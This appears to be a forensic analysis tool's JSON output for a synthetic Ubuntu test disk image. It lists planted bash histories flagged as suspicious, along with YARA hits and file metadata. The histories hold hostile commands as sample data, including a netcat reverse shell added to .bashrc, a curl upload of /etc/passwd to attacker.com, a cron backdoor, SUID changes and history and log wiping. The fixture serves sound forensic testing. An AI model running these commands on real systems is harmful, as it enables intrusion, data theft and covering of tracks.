@@ -1,0 +1,781 @@
+Analyzing disk image: test_ubuntu.dd
+WARNING: Partition detection failed: Volume_Info_Con: (tsk3.cpp:673) Error opening Volume_Info: (null)
+WARNING: Partition detection failed: Volume_Info_Con: (tsk3.cpp:673) Error opening Volume_Info: (null)
+{
+    "analysis_type": "disk_image",
+    "input_file": "forensic_images/test_ubuntu.dd",
+    "total_size": "2.25 KB",
+    "files_scanned": 14,
+    "directories_scanned": 15,
+    "status": "completed",
+    "system_intelligence": {
+        "os_type": "linux",
+        "hostname": "ubuntu-test-server",
+        "os_info": {
+            "name": "Ubuntu",
+            "version": "22.04.3 LTS (Jammy Jellyfish)",
+            "version_id": "22.04"
+        },
+        "user_profiles": [
+            "admin",
+            "alice",
+            "bob"
+        ],
+        "command_history": {
+            "admin": {
+                "files": [
+                    {
+                        "path": "/home/admin/.bash_history",
+                        "filename": ".bash_history",
+                        "command_count": 14
+                    }
+                ],
+                "commands": [
+                    "ls -la",
+                    "whoami",
+                    "sudo -i",
+                    "cat /etc/shadow",
+                    "cat /etc/passwd | grep admin",
+                    "crontab -e",
+                    "echo '*/5 * * * * /tmp/backdoor.sh' >> /var/spool/cron/crontabs/admin",
+                    "chmod +s /usr/bin/find",
+                    "chmod 4755 /tmp/exploit",
+                    "systemctl enable malicious.service",
+                    "echo 'nc -e /bin/bash 192.168.1.200 4444' >> ~/.bashrc",
+                    "history -c",
+                    "export HISTFILE=/dev/null",
+                    "shred -u ~/.bash_history.bak"
+                ],
+                "total_commands": 14
+            },
+            "alice": {
+                "files": [
+                    {
+                        "path": "/home/alice/.bash_history",
+                        "filename": ".bash_history",
+                        "command_count": 13
+                    }
+                ],
+                "commands": [
+                    "cd /var/www",
+                    "ls -la",
+                    "wget http://malicious-site.com/exfil.sh",
+                    "curl -X POST -d @/etc/passwd http://attacker.com/upload",
+                    "scp -r /home/alice/documents admin@192.168.1.100:/tmp/",
+                    "rsync -avz /var/log/auth.log remote@10.0.0.50:/backup/",
+                    "nc -lvp 4444",
+                    "ssh -L 8080:localhost:80 admin@192.168.1.100",
+                    "telnet 192.168.1.1",
+                    "ftp ftp.example.com",
+                    "base64 /etc/shadow > /tmp/shadow.b64",
+                    "xxd /bin/bash | head",
+                    "openssl enc -aes-256-cbc -in secrets.txt -out secrets.enc"
+                ],
+                "total_commands": 13
+            },
+            "bob": {
+                "files": [
+                    {
+                        "path": "/home/bob/.bash_history",
+                        "filename": ".bash_history",
+                        "command_count": 19
+                    }
+                ],
+                "commands": [
+                    "cd /tmp",
+                    "sudo su",
+                    "mysql -u root -p",
+                    "psql -U postgres -h 10.0.0.5",
+                    "sqlite3 /var/db/users.db",
+                    "pkexec /bin/bash",
+                    "chmod 777 /tmp",
+                    "rm -rf /var/log/*",
+                    "dd if=/dev/sda of=/tmp/disk.img bs=512 count=1000",
+                    "mkfs.ext4 /dev/sdb1",
+                    "gcc -o exploit exploit.c",
+                    "make install",
+                    "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"10.0.0.1\",4444))'",
+                    "perl -e 'use Socket; exec(\"/bin/sh -i\");'",
+                    "ruby -e 'exec \"/bin/bash\"'",
+                    "unset HISTFILE",
+                    "cat > ~/.bash_profile << EOF",
+                    "alias ls='ls --hide=backdoor'",
+                    "EOF"
+                ],
+                "total_commands": 19
+            }
+        },
+        "command_analysis": {
+            "total_users_with_history": 3,
+            "total_commands": 46,
+            "suspicious_commands": [
+                {
+                    "user": "admin",
+                    "command": "sudo -i"
+                },
+                {
+                    "user": "admin",
+                    "command": "cat /etc/shadow"
+                },
+                {
+                    "user": "admin",
+                    "command": "cat /etc/passwd | grep admin"
+                },
+                {
+                    "user": "admin",
+                    "command": "crontab -e"
+                },
+                {
+                    "user": "admin",
+                    "command": "chmod +s /usr/bin/find"
+                },
+                {
+                    "user": "admin",
+                    "command": "chmod 4755 /tmp/exploit"
+                },
+                {
+                    "user": "admin",
+                    "command": "systemctl enable malicious.service"
+                },
+                {
+                    "user": "admin",
+                    "command": "echo 'nc -e /bin/bash 192.168.1.200 4444' >> ~/.bashrc"
+                },
+                {
+                    "user": "admin",
+                    "command": "history -c"
+                },
+                {
+                    "user": "admin",
+                    "command": "export HISTFILE=/dev/null"
+                },
+                {
+                    "user": "admin",
+                    "command": "shred -u ~/.bash_history.bak"
+                },
+                {
+                    "user": "alice",
+                    "command": "wget http://malicious-site.com/exfil.sh"
+                },
+                {
+                    "user": "alice",
+                    "command": "scp -r /home/alice/documents admin@192.168.1.100:/tmp/"
+                },
+                {
+                    "user": "alice",
+                    "command": "rsync -avz /var/log/auth.log remote@10.0.0.50:/backup/"
+                },
+                {
+                    "user": "alice",
+                    "command": "nc -lvp 4444"
+                },
+                {
+                    "user": "alice",
+                    "command": "ssh -L 8080:localhost:80 admin@192.168.1.100"
+                },
+                {
+                    "user": "alice",
+                    "command": "telnet 192.168.1.1"
+                },
+                {
+                    "user": "alice",
+                    "command": "ftp ftp.example.com"
+                },
+                {
+                    "user": "alice",
+                    "command": "base64 /etc/shadow > /tmp/shadow.b64"
+                },
+                {
+                    "user": "alice",
+                    "command": "xxd /bin/bash | head"
+                },
+                {
+                    "user": "alice",
+                    "command": "openssl enc -aes-256-cbc -in secrets.txt -out secrets.enc"
+                },
+                {
+                    "user": "bob",
+                    "command": "sudo su"
+                },
+                {
+                    "user": "bob",
+                    "command": "mysql -u root -p"
+                },
+                {
+                    "user": "bob",
+                    "command": "psql -U postgres -h 10.0.0.5"
+                },
+                {
+                    "user": "bob",
+                    "command": "sqlite3 /var/db/users.db"
+                },
+                {
+                    "user": "bob",
+                    "command": "pkexec /bin/bash"
+                },
+                {
+                    "user": "bob",
+                    "command": "chmod 777 /tmp"
+                },
+                {
+                    "user": "bob",
+                    "command": "rm -rf /var/log/*"
+                },
+                {
+                    "user": "bob",
+                    "command": "dd if=/dev/sda of=/tmp/disk.img bs=512 count=1000"
+                },
+                {
+                    "user": "bob",
+                    "command": "mkfs.ext4 /dev/sdb1"
+                },
+                {
+                    "user": "bob",
+                    "command": "gcc -o exploit exploit.c"
+                },
+                {
+                    "user": "bob",
+                    "command": "make install"
+                },
+                {
+                    "user": "bob",
+                    "command": "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"10.0.0.1\",4444))'"
+                },
+                {
+                    "user": "bob",
+                    "command": "perl -e 'use Socket; exec(\"/bin/sh -i\");'"
+                },
+                {
+                    "user": "bob",
+                    "command": "ruby -e 'exec \"/bin/bash\"'"
+                },
+                {
+                    "user": "bob",
+                    "command": "unset HISTFILE"
+                },
+                {
+                    "user": "bob",
+                    "command": "cat > ~/.bash_profile << EOF"
+                }
+            ],
+            "network_commands": [
+                {
+                    "user": "admin",
+                    "command": "echo 'nc -e /bin/bash 192.168.1.200 4444' >> ~/.bashrc"
+                },
+                {
+                    "user": "alice",
+                    "command": "wget http://malicious-site.com/exfil.sh"
+                },
+                {
+                    "user": "alice",
+                    "command": "curl -X POST -d @/etc/passwd http://attacker.com/upload"
+                },
+                {
+                    "user": "alice",
+                    "command": "scp -r /home/alice/documents admin@192.168.1.100:/tmp/"
+                },
+                {
+                    "user": "alice",
+                    "command": "rsync -avz /var/log/auth.log remote@10.0.0.50:/backup/"
+                },
+                {
+                    "user": "alice",
+                    "command": "nc -lvp 4444"
+                },
+                {
+                    "user": "alice",
+                    "command": "ssh -L 8080:localhost:80 admin@192.168.1.100"
+                },
+                {
+                    "user": "alice",
+                    "command": "telnet 192.168.1.1"
+                },
+                {
+                    "user": "alice",
+                    "command": "ftp ftp.example.com"
+                },
+                {
+                    "user": "bob",
+                    "command": "psql -U postgres -h 10.0.0.5"
+                },
+                {
+                    "user": "bob",
+                    "command": "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"10.0.0.1\",4444))'"
+                }
+            ],
+            "file_operations": [
+                {
+                    "user": "admin",
+                    "command": "chmod +s /usr/bin/find"
+                },
+                {
+                    "user": "admin",
+                    "command": "chmod 4755 /tmp/exploit"
+                },
+                {
+                    "user": "bob",
+                    "command": "chmod 777 /tmp"
+                },
+                {
+                    "user": "bob",
+                    "command": "rm -rf /var/log/*"
+                }
+            ],
+            "most_common": [
+                {
+                    "command": "cat",
+                    "count": 3
+                },
+                {
+                    "command": "chmod",
+                    "count": 3
+                },
+                {
+                    "command": "ls",
+                    "count": 2
+                },
+                {
+                    "command": "sudo",
+                    "count": 2
+                },
+                {
+                    "command": "echo",
+                    "count": 2
+                },
+                {
+                    "command": "cd",
+                    "count": 2
+                },
+                {
+                    "command": "whoami",
+                    "count": 1
+                },
+                {
+                    "command": "crontab",
+                    "count": 1
+                },
+                {
+                    "command": "systemctl",
+                    "count": 1
+                },
+                {
+                    "command": "history",
+                    "count": 1
+                }
+            ]
+        }
+    },
+    "yara_detection": {
+        "total_files_scanned": 14,
+        "files_with_matches": 9,
+        "total_detections": 11,
+        "detections": [
+            {
+                "file": "/README.txt",
+                "rule": "email_addresses",
+                "size": 58
+            },
+            {
+                "file": "/etc/os-release",
+                "rule": "urls_and_links",
+                "size": 213
+            },
+            {
+                "file": "/home/admin/.bash_history",
+                "rule": "ip_addresses",
+                "size": 365
+            },
+            {
+                "file": "/home/admin/server_info.txt",
+                "rule": "email_addresses",
+                "size": 63
+            },
+            {
+                "file": "/home/admin/server_info.txt",
+                "rule": "ip_addresses",
+                "size": 63
+            },
+            {
+                "file": "/home/alice/.bash_history",
+                "rule": "ip_addresses",
+                "size": 451
+            },
+            {
+                "file": "/home/alice/.bash_history",
+                "rule": "urls_and_links",
+                "size": 451
+            },
+            {
+                "file": "/home/alice/notes.txt",
+                "rule": "email_addresses",
+                "size": 45
+            },
+            {
+                "file": "/home/bob/.bash_history",
+                "rule": "ip_addresses",
+                "size": 495
+            },
+            {
+                "file": "/home/bob/credentials.txt",
+                "rule": "suspicious_credentials",
+                "size": 57
+            },
+            {
+                "file": "/var/log/syslog",
+                "rule": "ip_addresses",
+                "size": 277
+            }
+        ]
+    },
+    "results": [
+        {
+            "name": "lost+found",
+            "path": "/lost+found",
+            "type": "dir",
+            "size": 16384,
+            "inode": 11,
+            "m_time": 1769454962,
+            "a_time": 1769454962,
+            "c_time": 1769454962,
+            "e_time": 1769454962
+        },
+        {
+            "name": "README.txt",
+            "path": "/README.txt",
+            "type": "file",
+            "size": 58,
+            "inode": 12,
+            "m_time": 1769454954,
+            "a_time": 1769454954,
+            "c_time": 1769454954,
+            "e_time": 1769454962,
+            "yara_matches": [
+                "email_addresses"
+            ]
+        },
+        {
+            "name": "bin",
+            "path": "/bin",
+            "type": "dir",
+            "size": 4096,
+            "inode": 13,
+            "m_time": 1769454954,
+            "a_time": 1769454958,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "etc",
+            "path": "/etc",
+            "type": "dir",
+            "size": 4096,
+            "inode": 14,
+            "m_time": 1769454954,
+            "a_time": 1769454958,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "hostname",
+            "path": "/etc/hostname",
+            "type": "file",
+            "size": 20,
+            "inode": 15,
+            "m_time": 1769454954,
+            "a_time": 1769454954,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "os-release",
+            "path": "/etc/os-release",
+            "type": "file",
+            "size": 213,
+            "inode": 16,
+            "m_time": 1769454954,
+            "a_time": 1769454954,
+            "c_time": 1769454954,
+            "e_time": 1769454962,
+            "yara_matches": [
+                "urls_and_links"
+            ]
+        },
+        {
+            "name": "passwd",
+            "path": "/etc/passwd",
+            "type": "file",
+            "size": 173,
+            "inode": 17,
+            "m_time": 1769454954,
+            "a_time": 1769454954,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "home",
+            "path": "/home",
+            "type": "dir",
+            "size": 4096,
+            "inode": 18,
+            "m_time": 1769454954,
+            "a_time": 1769454958,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "admin",
+            "path": "/home/admin",
+            "type": "dir",
+            "size": 4096,
+            "inode": 19,
+            "m_time": 1769454954,
+            "a_time": 1769454959,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": ".bash_history",
+            "path": "/home/admin/.bash_history",
+            "type": "file",
+            "size": 365,
+            "inode": 20,
+            "m_time": 1769454954,
+            "a_time": 1769454954,
+            "c_time": 1769454954,
+            "e_time": 1769454962,
+            "yara_matches": [
+                "ip_addresses"
+            ]
+        },
+        {
+            "name": ".bashrc",
+            "path": "/home/admin/.bashrc",
+            "type": "file",
+            "size": 34,
+            "inode": 21,
+            "m_time": 1769454954,
+            "a_time": 1769454954,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "server_info.txt",
+            "path": "/home/admin/server_info.txt",
+            "type": "file",
+            "size": 63,
+            "inode": 22,
+            "m_time": 1769454954,
+            "a_time": 1769454954,
+            "c_time": 1769454954,
+            "e_time": 1769454962,
+            "yara_matches": [
+                "email_addresses",
+                "ip_addresses"
+            ]
+        },
+        {
+            "name": "alice",
+            "path": "/home/alice",
+            "type": "dir",
+            "size": 4096,
+            "inode": 23,
+            "m_time": 1769454954,
+            "a_time": 1769454959,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": ".bash_history",
+            "path": "/home/alice/.bash_history",
+            "type": "file",
+            "size": 451,
+            "inode": 24,
+            "m_time": 1769454954,
+            "a_time": 1769454954,
+            "c_time": 1769454954,
+            "e_time": 1769454962,
+            "yara_matches": [
+                "ip_addresses",
+                "urls_and_links"
+            ]
+        },
+        {
+            "name": ".bashrc",
+            "path": "/home/alice/.bashrc",
+            "type": "file",
+            "size": 19,
+            "inode": 25,
+            "m_time": 1769454954,
+            "a_time": 1769454954,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "notes.txt",
+            "path": "/home/alice/notes.txt",
+            "type": "file",
+            "size": 45,
+            "inode": 26,
+            "m_time": 1769454954,
+            "a_time": 1769454954,
+            "c_time": 1769454954,
+            "e_time": 1769454962,
+            "yara_matches": [
+                "email_addresses"
+            ]
+        },
+        {
+            "name": "bob",
+            "path": "/home/bob",
+            "type": "dir",
+            "size": 4096,
+            "inode": 27,
+            "m_time": 1769454954,
+            "a_time": 1769454959,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": ".bash_history",
+            "path": "/home/bob/.bash_history",
+            "type": "file",
+            "size": 495,
+            "inode": 28,
+            "m_time": 1769454954,
+            "a_time": 1769454954,
+            "c_time": 1769454954,
+            "e_time": 1769454962,
+            "yara_matches": [
+                "ip_addresses"
+            ]
+        },
+        {
+            "name": "credentials.txt",
+            "path": "/home/bob/credentials.txt",
+            "type": "file",
+            "size": 57,
+            "inode": 29,
+            "m_time": 1769454954,
+            "a_time": 1769454954,
+            "c_time": 1769454954,
+            "e_time": 1769454962,
+            "yara_matches": [
+                "suspicious_credentials"
+            ]
+        },
+        {
+            "name": "root",
+            "path": "/root",
+            "type": "dir",
+            "size": 4096,
+            "inode": 30,
+            "m_time": 1769454954,
+            "a_time": 1769454958,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "tmp",
+            "path": "/tmp",
+            "type": "dir",
+            "size": 4096,
+            "inode": 31,
+            "m_time": 1769454954,
+            "a_time": 1769454958,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "usr",
+            "path": "/usr",
+            "type": "dir",
+            "size": 4096,
+            "inode": 32,
+            "m_time": 1769454954,
+            "a_time": 1769454958,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "bin",
+            "path": "/usr/bin",
+            "type": "dir",
+            "size": 4096,
+            "inode": 33,
+            "m_time": 1769454954,
+            "a_time": 1769454959,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "local",
+            "path": "/usr/local",
+            "type": "dir",
+            "size": 4096,
+            "inode": 34,
+            "m_time": 1769454954,
+            "a_time": 1769454959,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "var",
+            "path": "/var",
+            "type": "dir",
+            "size": 4096,
+            "inode": 35,
+            "m_time": 1769454954,
+            "a_time": 1769454958,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "log",
+            "path": "/var/log",
+            "type": "dir",
+            "size": 4096,
+            "inode": 36,
+            "m_time": 1769454954,
+            "a_time": 1769454959,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "syslog",
+            "path": "/var/log/syslog",
+            "type": "file",
+            "size": 277,
+            "inode": 37,
+            "m_time": 1769454954,
+            "a_time": 1769454954,
+            "c_time": 1769454954,
+            "e_time": 1769454962,
+            "yara_matches": [
+                "ip_addresses"
+            ]
+        },
+        {
+            "name": "www",
+            "path": "/var/www",
+            "type": "dir",
+            "size": 4096,
+            "inode": 38,
+            "m_time": 1769454954,
+            "a_time": 1769454959,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        },
+        {
+            "name": "index.html",
+            "path": "/var/www/index.html",
+            "type": "file",
+            "size": 37,
+            "inode": 39,
+            "m_time": 1769454954,
+            "a_time": 1769454954,
+            "c_time": 1769454954,
+            "e_time": 1769454962
+        }
+    ]
+}
